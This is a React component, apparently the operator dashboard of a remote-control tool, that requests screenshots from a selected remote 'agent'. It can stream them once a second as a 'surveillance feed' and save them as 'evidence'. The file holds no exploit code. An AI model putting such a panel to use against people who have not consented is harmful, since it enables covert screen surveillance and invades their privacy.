import React, { useState, useEffect, useRef } from 'react';
import { Camera, Download, Video, VideoOff, Maximize2, Loader2, Scan } from 'lucide-react';
import { useSocket } from '../contexts/SocketContext';
import { sendCommand } from '../services/socketService';
import { CyberCard, CyberButton } from './CyberUI';

export default function ScreenshotCard() {
    const [screenshot, setScreenshot] = useState<string | null>(null);
    const [loading, setLoading] = useState(false);
    const [isAutoRefreshing, setIsAutoRefreshing] = useState(false);
    const autoRefreshRef = useRef<NodeJS.Timeout | null>(null);

    const { socket, isConnected, selectedAgentId } = useSocket();

    // Lắng nghe sự kiện từ Server
    useEffect(() => {
        if (!socket) return;

        const handleReceiveImage = (base64String: string) => {
            setScreenshot(`data:image/png;base64,${base64String}`);
            setLoading(false);
        };

        const handleReceiveError = (errorMessage: string) => {
            setLoading(false);
            // Nếu đang auto-refresh mà lỗi thì dừng lại
            if (isAutoRefreshing) {
                setIsAutoRefreshing(false);
                if (autoRefreshRef.current) clearInterval(autoRefreshRef.current);
                alert("⚠ STREAM INTERRUPTED: " + errorMessage);
            } else {
                alert("❌ CAPTURE FAILED: " + errorMessage);
            }
        };

        socket.on("ReceiveScreenshot", handleReceiveImage);
        socket.on("ReceiveScreenshotError", handleReceiveError);

        return () => {
            socket.off("ReceiveScreenshot", handleReceiveImage);
            socket.off("ReceiveScreenshotError", handleReceiveError);
        };
    }, [socket, isAutoRefreshing]);

    // Xử lý Auto-Refresh (Giả lập Video Stream)
    useEffect(() => {
        if (isAutoRefreshing) {
            // Chụp ngay lập tức lần đầu
            handleTakeScreenshot(true); 
            
            // Lặp lại mỗi 1 giây (1000ms)
            autoRefreshRef.current = setInterval(() => {
                handleTakeScreenshot(true);
            }, 1000); 
        } else {
            if (autoRefreshRef.current) {
                clearInterval(autoRefreshRef.current);
                autoRefreshRef.current = null;
            }
        }

        return () => {
            if (autoRefreshRef.current) clearInterval(autoRefreshRef.current);
        };
    }, [isAutoRefreshing]);

    const handleTakeScreenshot = async (isSilent = false) => {
        if (!isConnected || !selectedAgentId) {
            if (!isSilent) alert('⚠ NO UPLINK ESTABLISHED!');
            return;
        }
        
        if (!isSilent) setLoading(true);
        
        try {
            // Gửi lệnh chụp tới Agent
            await sendCommand('take_screenshot');
        } catch (error: any) {
            setLoading(false);
            console.error("Capture Error:", error);
        }
    };

    const toggleAutoRefresh = () => {
        if (!selectedAgentId) return alert("⚠ SELECT TARGET FIRST!");
        setIsAutoRefreshing(!isAutoRefreshing);
    };

    const handleDownload = () => {
        if (screenshot) {
            const link = document.createElement('a');
            link.href = screenshot;
            link.download = `EVIDENCE_${Date.now()}.png`;
            link.click();
        }
    };

    return (
        <CyberCard title="SURVEILLANCE_FEED" className="h-full flex flex-col">
            {/* Header Status */}
            <div className="flex justify-between items-center mb-2 px-2 text-[10px] font-mono border-b border-gray-800 pb-2">
                <div className="flex items-center gap-2">
                    <div className={`w-2 h-2 rounded-full ${isAutoRefreshing ? 'bg-cyber-red animate-pulse' : 'bg-cyber-blue'}`}></div>
                    <span className={isAutoRefreshing ? 'text-cyber-red' : 'text-cyber-blue'}>
                        {isAutoRefreshing ? 'LIVE FEED ACTIVE' : 'STANDBY MODE'}
                    </span>
                </div>
                <div className="text-gray-500">RES: 1080P_HQ</div>
            </div>

            {/* Màn hình hiển thị ảnh */}
            <div className="relative flex-1 bg-black border border-gray-800 min-h-[250px] overflow-hidden group">
                {screenshot ? (
                    <>
                        <img
                            src={screenshot}
                            alt="Surveillance Feed"
                            className="w-full h-full object-contain"
                        />
                        {/* Overlay thông số */}
                        <div className="absolute top-2 left-2 bg-black/80 border border-cyber-blue/30 px-2 py-1 text-[10px] text-cyber-blue font-mono">
                            CAM_01: REMOTE_DESKTOP
                        </div>
                        {/* Hiệu ứng REC khi đang stream */}
                        {isAutoRefreshing && (
                            <div className="absolute top-2 right-2 flex items-center gap-1 bg-cyber-red/20 border border-cyber-red px-2 py-1 rounded">
                                <div className="w-2 h-2 bg-cyber-red rounded-full animate-pulse"></div>
                                <span className="text-[10px] text-cyber-red font-bold">REC</span>
                            </div>
                        )}
                    </>
                ) : (
                    // Màn hình chờ (No Signal)
                    <div className="absolute inset-0 flex flex-col items-center justify-center bg-[url('https://grainy-gradients.vercel.app/noise.svg')] opacity-50">
                        {loading ? (
                            <div className="flex flex-col items-center">
                                <Loader2 className="w-10 h-10 text-cyber-yellow animate-spin mb-2" />
                                <span className="text-cyber-yellow text-xs animate-pulse">ESTABLISHING LINK...</span>
                            </div>
                        ) : (
                            <div className="flex flex-col items-center opacity-50">
                                <Scan className="w-16 h-16 text-gray-600 mb-2" />
                                <span className="text-gray-500 text-xs">NO VISUAL DATA</span>
                            </div>
                        )}
                    </div>
                )}
                
                {/* Scanline Effect Overlay */}
                <div className="absolute inset-0 pointer-events-none bg-[linear-gradient(rgba(18,16,16,0)_50%,rgba(0,0,0,0.25)_50%),linear-gradient(90deg,rgba(255,0,0,0.06),rgba(0,255,0,0.02),rgba(0,0,255,0.06))] z-10 bg-[length:100%_2px,3px_100%]"></div>
            </div>

            {/* Control Panel (Buttons) */}
            <div className="grid grid-cols-12 gap-2 mt-4">
                {/* Nút Chụp ảnh đơn (Chiếm 5 phần) */}
                <div className="col-span-5">
                    <CyberButton 
                        onClick={() => handleTakeScreenshot(false)} 
                        disabled={loading || isAutoRefreshing}
                        className="w-full py-3 text-xs"
                    >
                        <Camera className="w-4 h-4 mr-1" /> SNAPSHOT
                    </CyberButton>
                </div>

                {/* Nút Quay/Stream (Chiếm 5 phần) */}
                <div className="col-span-5">
                    <CyberButton 
                        onClick={toggleAutoRefresh} 
                        variant={isAutoRefreshing ? "danger" : "secondary"}
                        className="w-full py-3 text-xs"
                    >
                        {isAutoRefreshing ? (
                            <><VideoOff className="w-4 h-4 mr-1" /> STOP FEED</>
                        ) : (
                            <><Video className="w-4 h-4 mr-1" /> LIVE FEED</>
                        )}
                    </CyberButton>
                </div>

                {/* Nút Tải về (Chiếm 2 phần) */}
                <div className="col-span-2">
                    <CyberButton 
                        onClick={handleDownload} 
                        disabled={!screenshot}
                        variant="ghost"
                        className="w-full py-3 px-0 flex justify-center"
                    >
                        <Download className="w-4 h-4" />
                    </CyberButton>
                </div>
            </div>
        </CyberCard>
    );
}